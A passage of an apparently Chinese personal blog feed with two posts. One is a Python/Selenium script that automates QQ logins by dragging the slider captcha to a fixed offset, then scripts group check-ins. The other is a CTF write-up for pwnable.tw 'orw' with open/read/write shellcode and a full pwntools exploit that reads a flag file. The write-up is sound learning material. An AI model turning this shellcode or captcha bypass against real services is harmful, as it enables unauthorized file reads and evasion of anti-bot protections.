title="如何自动获取skey?"></a>如何自动获取skey?</h2><p>由于QQ空间登陆的时候有滑块验证，这里想用requests库来实现登陆并获取cookie并不太好弄。</p><p>这里选择先用selenium库实现QQ空间登陆，获取到cookie（主要是获取cookie里的skey）后直接让requests库利用。（毕竟skey的生存期至少是24小时）</p><p><strong>非常幸运的是：QQ空间登陆的时候，滑块只需要拖动170到180之间某个像素位即可，这个值是随机的。</strong></p><p>我们取中位数175，然后借助selenium的ActionChains来模拟拖动滑块。</p><p>因为是随机的，多试几次碰碰运气，总能成功的。</p><h2 id="挂到服务器上执行脚本并没有效果且未报错"><a href="#挂到服务器上执行脚本并没有效果且未报错" class="headerlink" title="挂到服务器上执行脚本并没有效果且未报错"></a>挂到服务器上执行脚本并没有效果且未报错</h2><p>这个脚本早在几天前就写好了，但是挂到服务器上一直没有效果…</p><p>我一直在找原因，直到昨天，我决定给服务器加个桌面化，通过VNC进行连接服务器，以可视化的方式看看到底出了什么问题。</p><p>然后我发现，在拖动好滑块以后，还需要进行手机验证码验证…</p><p><strong>大概是腾讯出于安全的考虑，毕竟在服务器登录也算是异地登录…</strong></p><p>我尝试着进行了手机验证码验证，但是在下一次模拟登陆的时候依然是需要手机验证码登录…</p><p>而且我也检查了我QQ的各种登录保护，<strong>确定没开登陆地保护和设备锁之类的保护措施</strong>。</p><p>无奈之下，我尝试了进行二维码扫码登录，这不需要手机验证码验证，但是这不符合我的全自动化要求。</p><p>多次尝试各种方法以后，依然需要手机验证码验证…</p><p>过了许久，突发奇想，我在服务器(ubuntu18.04)借助远程连接图形化界面下载一个Linux版本的QQ，登陆几次，会不会解决这个问题。</p><p>也可能是这个方法生效了，模拟登陆的时候不再需要手机验证码验证了。(o^_^o)</p><h1 id="0x03-脚本源码"><a href="#0x03-脚本源码" class="headerlink" title="0x03 脚本源码"></a>0x03 脚本源码</h1><p>脚本所用python版本:2.7.17</p><p>脚本由UserInfo.py与test.py组成，懒得改名了，就这么命名吧。</p><p>其中UserInfo.py算是存放需要进行Q群签到的QQ的信息吧</p><p>结构如下</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200703233309935.png" alt></p><p>即 [ uin,QQ号,QQ密码,[需要签到的Q群list] ] 这种结构。</p><p>test.py内容如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> UserInfo <span class="keyword">import</span> usersInfo</span><br><span class="line"></span><br><span class="line">__Author__ = <span class="string">'LiuLian'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sign</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,uin,Qnum,Qpsd,QqunList)</span>:</span></span><br><span class="line">        self.uin = uin</span><br><span class="line">        self.skey = <span class="string">''</span></span><br><span class="line">        self.Qnum = Qnum</span><br><span class="line">        self.Qpsd = Qpsd</span><br><span class="line">        self.QqunList = QqunList</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Getskey</span><span class="params">(self)</span>:</span></span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        hasfound = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[*]'</span> + self.Qnum + <span class="string">' 正在进行第'</span> + str(count) +<span class="string">'次尝试...'</span></span><br><span class="line">            opt = webdriver.ChromeOptions()</span><br><span class="line">            opt.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">            opt.add_argument(<span class="string">'--no-sandbox'</span>)</span><br><span class="line">            driver = webdriver.Chrome(options=opt)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            driver.get(<span class="string">'https://qzone.qq.com'</span>)</span><br><span class="line">            <span class="comment">#print driver.page_source.encode('utf-8')</span></span><br><span class="line">            driver.switch_to.frame(<span class="string">'login_frame'</span>)</span><br><span class="line">            a_tag = driver.find_element_by_id(<span class="string">'switcher_plogin'</span>)</span><br><span class="line">            a_tag.click()</span><br><span class="line">            userName_tag = driver.find_element_by_id(<span class="string">'u'</span>)</span><br><span class="line">            passWord_tag = driver.find_element_by_id(<span class="string">'p'</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            userName_tag.send_keys(self.Qnum)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            passWord_tag.send_keys(self.Qpsd)</span><br><span class="line">            btn = driver.find_element_by_id(<span class="string">"login_button"</span>)</span><br><span class="line">            btn.click()</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            iframe = driver.find_element_by_xpath(<span class="string">'//*[@id="tcaptcha_iframe"]'</span>)  <span class="comment"># 找到“嵌套”的iframe</span></span><br><span class="line">            driver.switch_to.frame(iframe)  <span class="comment"># 切换到iframe</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            button = driver.find_element_by_id(<span class="string">'tcaptcha_drag_button'</span>)  <span class="comment"># 寻找滑块</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 开始拖动 perform()用来执行ActionChains中存储的行为</span></span><br><span class="line">            distance = <span class="number">175</span></span><br><span class="line">            action = ActionChains(driver)</span><br><span class="line">            action.reset_actions()  <span class="comment"># 清除之前的action</span></span><br><span class="line">            action.click_and_hold(button).perform()  <span class="comment"># click_and_hold 点击并保持</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            action.move_by_offset(distance, <span class="number">0</span>).release().perform()</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">            cookies = driver.get_cookies()</span><br><span class="line">            <span class="keyword">for</span> dic <span class="keyword">in</span> cookies:</span><br><span class="line">                <span class="keyword">if</span> dic.values()[<span class="number">1</span>] == <span class="string">u'skey'</span>:</span><br><span class="line">                    self.skey = dic.values()[<span class="number">2</span>].encode(<span class="string">"utf8"</span>, <span class="string">"ignore"</span>)</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'[+]'</span> + self.Qnum + <span class="string">'的skey = '</span> + self.skey</span><br><span class="line">                    hasfound = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 退出浏览器</span></span><br><span class="line">            driver.quit()</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> hasfound:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> count &gt; <span class="number">100</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] 失败太多次了! 终止..'</span></span><br><span class="line">                self.skey = <span class="string">'5555555555'</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Getgtk</span><span class="params">(self)</span>:</span></span><br><span class="line">        hashes = <span class="number">5381</span></span><br><span class="line">        <span class="keyword">for</span> letter <span class="keyword">in</span> self.skey:</span><br><span class="line">            hashes += (hashes &lt;&lt; <span class="number">5</span>) + ord(letter)</span><br><span class="line">        <span class="keyword">return</span> hashes &amp; <span class="number">0x7fffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.Getskey()</span><br><span class="line">        url = <span class="string">'https://qun.qq.com/cgi-bin/qiandao/sign/publish'</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'Host'</span>:<span class="string">'qun.qq.com'</span>,</span><br><span class="line">            <span class="string">'Origin'</span>:<span class="string">'https://qun.qq.com'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045224 Mobile Safari/537.36 V1_AND_SQ_8.3.9_1424_YYB_D QQ/8.3.9.4635 NetType/4G WebP/0.3.0 Pixel/1080 StatusBarHeight/80 SimpleUISwitch/0 QQTheme/2081'</span>,</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">'uin='</span> + self.uin + <span class="string">';skey='</span> + self.skey</span><br><span class="line">        &#125;</span><br><span class="line">        bkn = self.Getgtk()</span><br><span class="line">        <span class="keyword">for</span> gc <span class="keyword">in</span> self.QqunList:</span><br><span class="line">            data = &#123;</span><br><span class="line">                    <span class="string">'bkn'</span>: bkn,<span class="comment">#这是根据skey按照一个算法生成的,等下会介绍</span></span><br><span class="line">                    <span class="string">"category_id"</span>: <span class="number">9</span>,<span class="comment">#类别ID,这是Q群签到的一个选项来着...抓包拿到的是9,可以自行更改</span></span><br><span class="line">                    <span class="string">"page"</span>: <span class="number">0</span>,<span class="comment">#好像和其他几个有关联?</span></span><br><span class="line">                    <span class="string">"pic_id"</span>: <span class="number">124</span>,<span class="comment">#签到图片ID</span></span><br><span class="line">                    <span class="string">'gc'</span>: gc,<span class="comment">#QQ群号</span></span><br><span class="line">                    <span class="string">'client'</span>: <span class="string">'2'</span>,<span class="comment">#我也不知道,反正我抓包拿到的是2...应该能自行更改</span></span><br><span class="line">                    <span class="string">'lgt'</span>: <span class="string">'0'</span>,<span class="comment">#经度</span></span><br><span class="line">                    <span class="string">'lat'</span>: <span class="string">'0'</span>,<span class="comment">#纬度</span></span><br><span class="line">                    <span class="string">'poi'</span>: <span class="string">'签到地点'</span>,<span class="comment">#可以自行更改</span></span><br><span class="line">                    <span class="string">'text'</span>: <span class="string">'你想说的话'</span><span class="comment">#可以自行更改</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> requests.post(url=url, data=data, headers=headers).content \</span><br><span class="line">                    == <span class="string">'&#123;"cgicode":0,"retcode":0,"msg":"","data":&#123;&#125;&#125;'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] '</span> + time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()) \</span><br><span class="line">                      + <span class="string">'QQ:'</span> + self.uin[<span class="number">1</span>:] + <span class="string">' 群号:'</span> + gc + <span class="string">'签到成功!'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] '</span> + time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()) \</span><br><span class="line">                      + <span class="string">'QQ:'</span> + self.uin[<span class="number">1</span>:] + <span class="string">' 群号:'</span> + gc + <span class="string">'签到失败!'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> userInfo <span class="keyword">in</span> usersInfo:</span><br><span class="line">        test = Sign(userInfo[<span class="number">0</span>],userInfo[<span class="number">1</span>],userInfo[<span class="number">2</span>],userInfo[<span class="number">3</span>])</span><br><span class="line">        test.sign()</span><br></pre></td></tr></table></figure><h1 id="0x04-挂载到服务器"><a href="#0x04-挂载到服务器" class="headerlink" title="0x04 挂载到服务器"></a>0x04 挂载到服务器</h1><p>要现在服务器安装好脚本所需的必要环境：python2.7、requests库、selenium库及其对应的google-chrome和chromedriver，具体不再多说。</p><p>设置定时任务:</p><p>这里采用linux的 crontab 。</p><p>阿里云的服务器自带…其他的服务器自带与否我也不清楚</p><p>执行<code>sudo vim /etc/crontab</code>来编辑设置定时任务</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200703234530.png" alt></p><p>最后一行才是我自己设置的，其余全是服务器本身设置的。</p><p>最后一行表示每天早上6点以root权限执行该脚本，并将输出信息追加保存到我的log文件中，log文件自己创就行…保不保存其实都可以，看自己选择了。</p><p>这些路径根据自己的实际路径修改就行。</p><h1 id="0x05-写在最后"><a href="#0x05-写在最后" class="headerlink" title="0x05 写在最后"></a>0x05 写在最后</h1><p>懒惰是人类发展的第一生产力，如果我不是个懒狗，我也不会想着去写这个脚本。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/49b39a16f132ed84.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/Hatsune_miku_1563684099804.jpeg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://liul14n.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Pwnable_orw</title>
    <link href="http://liul14n.top/2020/05/19/Pwnable-orw/"/>
    <id>http://liul14n.top/2020/05/19/Pwnable-orw/</id>
    <published>2020-05-18T16:02:22.000Z</published>
    <updated>2020-05-19T15:40:45.920Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/44892197_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>咕了许久，重拾本就会的不多的pwn，发现不太顺手了。</p><p>之前也接触过ORW的题目，但没去深入的了解其细节，只抄了个EXP拿了个flag就完事了。</p><p>今天用这道题目详细记录一下ORW类型的题目。</p><p>题目原出处是在pwnable.tw， BUUCTF上面也有。</p><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h1><h2 id="保护与main函数"><a href="#保护与main函数" class="headerlink" title="保护与main函数"></a>保护与main函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200519000820.png" alt></p><p>主函数逻辑也特别简单，读取我们的输入存到变量shellcode处，然后执行<code>shellcode()</code>。</p><p>如果忽视掉第3行的<code>orw_seccomp()</code>那么就可以直接向程序输入一段shellcode就能getshell。</p><h2 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h2><p>第3行的内容也便是ORW这类题目的重点所在。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200519001045.png" alt></p><p>关于seccomp：</p><blockquote><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。</p><p>seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p><p>seccomp 简单来说就是一个白名单，每个进程进行系统调用（system call）时，kernal 都会检查对应的白名单以确认该进程是否有权限使用这个系统调用。这个白名单是用 berkeley package filter（BPF）格式书写的。</p></blockquote><p>具体可以参考如下链接：</p><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">大佬的博客</a></p><p><a href="https://blog.csdn.net/mashimiao/article/details/73607485" target="_blank" rel="noopener">CSDN</a></p><p>PS: 第一个博客里也讲到了这道题目是如何实现seccomp的了，是与<code>prctl</code>有关。</p><p>PS: 而我第一次遇到ORW的题目是在极客大挑战2019 的 babyshellcode和Not bad这俩题目，这俩题目都是通过<code>seccomp_rule_add</code>来实现seccomp的。</p><p>也就是说，这个程序相当于禁用了system。</p><p>这段程序中，unk_8048640位置存储的即为“白名单”，通过这个白名单，可以看到这个程序允许的系统调用。</p><p>之前看到过一篇博文，有师傅手动把这个白名单提取出来了，但是我找不到博文链接了。</p><h2 id="工具seccomp-tools"><a href="#工具seccomp-tools" class="headerlink" title="工具seccomp-tools"></a>工具seccomp-tools</h2><p>用工具<code>seccomp-tools</code>能更直观更便捷的查看这个“白名单”。</p><p>安装seccomp-tools步骤(环境Ubuntu 16.04)：</p><p>首先需要gem和ruby(版本&gt;=2.4)：</p><p>我用的阿里云的源，通过apt-get 安装的ruby版本是2.3，死活安不上2.4，Google了一番找到了安装方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-add-repository ppa:brightbox/ruby-ng</span><br><span class="line"></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install ruby2.4 ruby2.4-dev</span><br></pre></td></tr></table></figure><p>然后<code>sudo gem install seccomp-tools</code>即可。</p><p>终端执行命令<code>$ seccomp-tools dump ./orw</code>即可查看“白名单”</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200519003049.png" alt></p><p>绿色的即为允许的系统调用。</p><p>可以看到该程序可以进行open read write等系统调用。</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>结合前面的分析，<strong>这道题目的解题策略可以确定为ORW即open、read、write，也就是先打开存放flag的文件，将其内容读取到某块缓冲区，然后通过write打印出来。</strong></p><h1 id="0x02-Do-it！"><a href="#0x02-Do-it！" class="headerlink" title="0x02 Do it！"></a>0x02 Do it！</h1><h2 id="关于系统调用"><a href="#关于系统调用" class="headerlink" title="关于系统调用"></a>关于系统调用</h2><p>对于32位来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">系统调用号：EAX</span><br><span class="line"></span><br><span class="line">参数：EBX、ECX、EDX、ESI、EDI、EBP</span><br><span class="line"></span><br><span class="line">返回值：EAX</span><br></pre></td></tr></table></figure><p>对于64位来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">系统调用号：RAX</span><br><span class="line"></span><br><span class="line">参数：RDI、RSI、RDX、R10、R8、R9</span><br><span class="line"></span><br><span class="line">返回值：RAX</span><br></pre></td></tr></table></figure><p>对于我们的ORW（32位）来说：</p><table><thead><tr><th>系统调用号:eax</th><th>Name</th><th>args1:ebx</th><th>args2:ecx</th><th>args3:edx</th></tr></thead><tbody><tr><td>3</td><td>sys_read</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>4</td><td>sys_write</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>5</td><td>sys_open</td><td>char __user *filename</td><td>int flags</td><td>int mode</td></tr></tbody></table><h2 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h2><p>首先我们需要open，由于BUUOJ上面存放flag的文件名就叫flag，这也就为我们open提供了便利。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//open(flag,0,0)</span><br><span class="line">mopen = &apos;&apos;&apos;</span><br><span class="line">mov eax,5;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">push 0;                \x00 用于截断字符串(flag)</span><br><span class="line">push 0x67616C66;       flag的小端序写法</span><br><span class="line">mov ebx,esp;           esp指向字符串&quot;flag\0&quot;</span><br><span class="line">int 0x80;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">//read(fd,esp,0x50)    fd即open的返回值，存在eax中。</span><br><span class="line">mread = &apos;&apos;&apos;</span><br><span class="line">mov ecx,ebx;            esp处用作缓冲区读取flag</span><br><span class="line">mov ebx,eax;            eax为open的返回值，即读取到的文件的file ID(如果读取失败则返回-1)</span><br><span class="line">mov eax,3;</span><br><span class="line">mov edx,0x50;</span><br><span class="line">int 0x80;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">//write(1,esp,0x50)</span><br><span class="line">mwrite = &apos;&apos;&apos;</span><br><span class="line">mov eax,4;</span><br><span class="line">mov ebx,1;              文件描述符 stdout</span><br><span class="line">mov edx,0x50;</span><br><span class="line">int 0x8</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure><p>这段汇编应该挺容易理解的，然后就没啥难点了…</p><p>同样还可以利用pwntools的shellcraft来构造，需要指明<code>context.arch</code>，32位就i386,64位就amd64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sh = shellcraft.pushstr(<span class="string">'flag'</span>)</span><br><span class="line">sh += shellcraft.syscall(<span class="string">'SYS_open'</span>,<span class="string">"esp"</span>,<span class="number">0</span>)</span><br><span class="line">sh += shellcraft.syscall(<span class="string">'SYS_read'</span>,<span class="string">'eax'</span>,<span class="string">'esp'</span>,<span class="number">0x50</span>)</span><br><span class="line">sh += shellcraft.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>,<span class="string">'esp'</span>,<span class="number">0x50</span>)</span><br><span class="line">sh = asm(sh)</span><br></pre></td></tr></table></figure><h1 id="0x03完整EXP"><a href="#0x03完整EXP" class="headerlink" title="0x03完整EXP"></a>0x03完整EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line">c = process(<span class="string">'./orw'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',26916)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c,'b*0x804858A')</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Give my your shellcode:'</span>)</span><br><span class="line"></span><br><span class="line">mopen = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,5;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">push 0x67616C66;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">mread = <span class="string">'''</span></span><br><span class="line"><span class="string">mov ecx,ebx;</span></span><br><span class="line"><span class="string">mov ebx,eax;</span></span><br><span class="line"><span class="string">mov eax,3;</span></span><br><span class="line"><span class="string">mov edx,0x50;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">mwrite = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,4;</span></span><br><span class="line"><span class="string">mov ebx,1;</span></span><br><span class="line"><span class="string">mov edx,0x50;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = asm(mopen) + asm(mread) + asm(mwrite)</span><br><span class="line"><span class="keyword">print</span> hex(len(sh))</span><br><span class="line">c.sendline(sh)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>这段EXP在BUUOJ上是可以打通的，如果想在pwnable.tw打通，需要修改一下 open 那块的汇编，应该向ebx传入flag文件的绝对路径。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/44892197_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>[Python]一次爬虫模拟登录的尝试</title>
    <link href="http://liul14n.top/2020/04/02/Python-%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E7%9A%84%E5%B0%9D%E8%AF%95/"/>
    <id>http://liul14n.top/2020/04/02/Python-一次爬虫模拟登录的尝试/</id>
    <published>2020-04-01T18:22:10.000Z</published>
    <updated>2020-12-22T08:49:31.962Z</updated>
    
